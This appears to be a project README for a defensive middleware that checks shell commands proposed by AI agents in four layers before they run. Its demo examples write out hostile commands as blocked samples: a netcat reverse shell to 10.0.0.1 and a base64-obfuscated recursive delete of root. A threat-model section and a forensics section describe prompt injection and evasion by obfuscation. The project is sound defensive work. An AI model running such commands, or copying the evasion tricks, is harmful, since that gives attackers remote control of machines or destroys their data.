# AI Guardian Lab

![Status](https://img.shields.io/badge/status-experimental-orange)
![Version](https://img.shields.io/badge/version-1.2.0-blue)
![License](https://img.shields.io/badge/license-MIT-green)
![Precision](https://img.shields.io/badge/precision-100%25-brightgreen)
![Recall](https://img.shields.io/badge/recall-100%25-brightgreen)

AI agents can run shell commands on your machine. Guardian decides which ones actually run.

AI agent frameworks often provide LLMs with direct shell access to complete tasks. In most implementations, security relies entirely on the model's willingness to follow system instructions. But model compliance is not the same thing as security enforcement.

## See it in action

```
task:    "list files"
command: "nc -e /bin/bash 10.0.0.1 4444"
layer:   L1 — Binary Allowlist
verdict: BLOCKED
reason:  Binary 'nc' is in the red-zone/not permitted in this context.
```

```
task:    "check disk"
command: "$(echo cm0gLXJmIC8= | base64 -d)"
layer:   L2 — Regex Engine
verdict: BLOCKED
reason:  Obfuscation pattern detected (base64 decoding in shell command).
```

```
task:    "analyze disk usage"
command: "rm -rf /tmp"
layer:   L3 — Intent Coherence
verdict: BLOCKED
reason:  Task intent is 'read/analyze', command action is 'delete'. Conflict detected. ← This is L3: Intent Coherence. The differentiator.
```

```
task:    "clean temp files"
command: "find /tmp -mtime +7 -delete"
layer:   L4 — LLM Semantic Check
verdict: ALLOWED
reason:  Ambiguous use of 'delete' is justified by the task intent 'clean temp files'.
```

## Why this exists

The AI ecosystem has an enforcement gap. While we have tools to monitor inputs and outputs, no major agent framework ships with native, pre-tool execution control. Prompt engineering is often used as a defense, but it is a suggestion, not a secure boundary. Guardian solves this by providing a deterministic intermediate layer that removes final decision-making power from the LLM for system-level actions.

## How it works

Guardian operates a 4-layer validation pipeline. It is "Fail-Closed" by design: if a layer has a doubt, the command is blocked.

```
 Agent Request
      │
      ▼
 ┌─────────────────────────┐
 │  L1: Binary Allowlist   │──► BLOCK (unknown or red-zone binary)
 └───────────┬─────────────┘
             │
             ▼
 ┌─────────────────────────┐
 │  L2: Regex Engine       │──► BLOCK (obfuscation / destruction pattern)
 └───────────┬─────────────┘
             │
             ▼
 ┌─────────────────────────┐
 │  L3: Intent Coherence   │──► BLOCK (task intent ≠ command action)
 └───────────┬─────────────┘
             │
             ▼
 ┌─────────────────────────┐
 │  L4: LLM Semantic Check │──► BLOCK / ALLOW (ambiguous cases only)
 └───────────┬─────────────┘
             │
             ▼
        EXECUTE
```

1.  **L1: Binary Allowlist**: Immediate filter based on risk zones (green, yellow, red). If a binary is not explicitly permitted in the current context, the execution dies here.
2.  **L2: Regex Pattern Matching**: A dual-path ReDoS-safe engine that checks both the raw and normalized command against patterns of obfuscation, exfiltration, and destruction.
3.  **L3: Intent Coherence Mapping**: This is the differentiator. It maps both the `task` field and the command to one of four intent families — `read`, `write`, `delete`, `network` — using a static keyword taxonomy, then checks for conflicts. The taxonomy is intentionally minimal to keep deterministic rules auditable and predictable.

    | Task intent | Command intent | Result  |
    |-------------|----------------|---------|
    | read        | delete         | BLOCKED |
    | read        | network        | BLOCKED |
    | write       | delete         | BLOCKED |
    | write       | read           | ALLOWED |
    | delete      | delete         | ALLOWED |

    Example: `task="analyze disk usage"` + `command="rm -rf /tmp"` → task maps to `read`, command maps to `delete` → **BLOCKED**.

4.  **L4: LLM Semantic Check**: The LLM is the last resort. It is consulted only for ambiguous cases that deterministic layers cannot resolve, adding a final level of semantic understanding.

## Why determinism first

I prioritized deterministic checks over LLM-based validation for three reasons:
- **Transparency**: You can audit the regex and the mappings. You know exactly why a command was blocked.
- **Speed**: Deterministic checks take milliseconds and require zero tokens.
- **Reliability**: Logic does not "hallucinate". It offers a rigid boundary that no prompt injection can jump.

**On L4:** The LLM layer is not a fallback for cases the deterministic layers "couldn't handle" — it is a deliberate scope boundary. L1–L3 cover the known attack surface: known-bad binaries, known patterns, and intent conflicts with a clear mapping. L4 handles the residual: commands that are structurally valid, not matched by any pattern, and whose task-command relationship is ambiguous by design. In practice, L4 fires on fewer than 5% of requests. The LLM cannot override a block issued by L1–L3. The enforcement hierarchy is strictly one-directional.

## Benchmark

Evaluated on a synthetic dataset of 100 labeled commands (50 benign, 50 malicious), designed to cover the known attack surface of the current policy configuration.

| Metric          | Score  |
|-----------------|--------|
| Precision       | 100%   |
| Recall          | 100%   |
| False Positives | 0      |
| False Negatives | 0      |

Dataset and test suite: [`tests/`](tests/)

Results reflect the current policy configuration. Scores may vary with custom policies.

## How Guardian compares

| Feature                        | AI Guardian Lab | LLM Guard | Guardrails AI |
|-------------------------------|-----------------|-----------|---------------|
| Deterministic enforcement      | ✅              | Partial   | ❌            |
| Intent coherence check         | ✅              | ❌        | ❌            |
| Framework-agnostic (REST API)  | ✅              | ❌        | Partial       |
| Fail-closed by default         | ✅              | ❌        | ❌            |
| LLM as last resort only        | ✅              | ❌        | ❌            |
| Audit log                      | ✅              | Partial   | Partial       |

Comparison based on public documentation as of March 2026. LLM Guard and Guardrails AI are input/output scanners, not command-level enforcement layers — different design goals with some overlap. This table focuses exclusively on command-level enforcement capabilities.

## The integration wall

Agent frameworks block calls to private IPs by design for SSRF protection. This is an intentional and correct choice, but it has a heavy side effect: Guardian's enforcement today depends on model compliance (which must be instructed to call the middleware) rather than a native hard hook in the framework. This is an open problem for the entire ecosystem: true, unbreakable automatic enforcement will only arrive when frameworks implement native pre-tool hooks.

## Forensics: Post-session Analysis

Guardian also ships a post-mortem analysis module. While the validation pipeline intercepts commands in real time, the forensics module analyzes completed agent sessions to detect behavioral anomalies after the fact.

It works with any agent framework that produces structured logs — not just Guardian-instrumented agents.

**What it detects:**
- **Tool escalation** — sessions where risk progresses from safe to dangerous commands
- **Intent drift** — actions that diverge from the stated task
- **Prompt injection signals** — tool outputs containing embedded instructions

**Try it:**
```bash
bash demo_forensics.sh
```

**API:**
```bash
curl -s -X POST http://localhost:5000/forensics/analyze \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"jsonl": "{\"role\": \"user\", \"content\": \"list files\"}\n..."}'
```

The response includes an anomaly score (0–100), per-flag analysis with confidence levels, and a human-readable summary.

## Quick Start

#### 1. Installation
```bash
git clone https://github.com/Lukentony/AI-guardian-lab.git
cd ai-guardian-lab
./install.sh
```

#### 2. Start
```bash
docker-compose up -d
```

### 3. Try it

```bash
# Block a dangerous command
curl -s -X POST http://localhost:5000/validate \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"command": "rm -rf /tmp", "task": "analyze disk usage"}'
```

```json
{
  "approved": false,
  "layer": "L3",
  "reason": "Intent conflict: task maps to 'read', command maps to 'delete'.",
  "command": "rm -rf /tmp",
  "task": "analyze disk usage"
}
```

```bash
# Allow a safe command
curl -s -X POST http://localhost:5000/validate \
  -H "Content-Type: application/json" \
  -H "X-API-Key: your-api-key" \
  -d '{"command": "df -h", "task": "analyze disk usage"}'
```

```json
{
  "approved": true,
  "layer": null,
  "reason": null,
  "command": "df -h",
  "task": "analyze disk usage"
}
```

## Use cases

- **Local Testing**: Developers testing AI agents locally who want to understand what they are trying to do before giving total access.
- **Audit & Compliance**: Those who need immutable logs of every single command attempted by an agent, including rejections.
- **Hard Chokepoint**: Those who want a real filter between the LLM and the shell without hoping the model "behaves well" by following system instructions.

## Threat Model & Limits

**Attacker model:** Guardian assumes an adversary who:
- Injects malicious instructions through user-controlled input fields (prompt injection)
- Obfuscates commands to evade pattern matching (encoding, variable expansion, chaining)
- Attempts to exploit the gap between a task description and the actual command executed
- Controls the LLM's output but cannot directly modify Guardian's configuration or policy files

Guardian is a shield, not a miracle:
1.  **Regex limitations**: Extremely sophisticated obfuscations could theoretically evade static patterns.
2.  **Normalization**: The variety of shell syntax is a constant battleground; some edge cases may require updates to the normalization rules.
3.  **Sandbox Dependency**: Guardian blocks commands, but final security also depends on the environment isolation (sandbox/docker) where the agent runs.

## Documentation
- [Architecture & Layers](ARCHITECTURE.md)
- [Contributing](CONTRIBUTING.md)
- [Security Policy](SECURITY_POLICY.md)

---

## 📄 License
MIT License. See [LICENSE](LICENSE) for details.
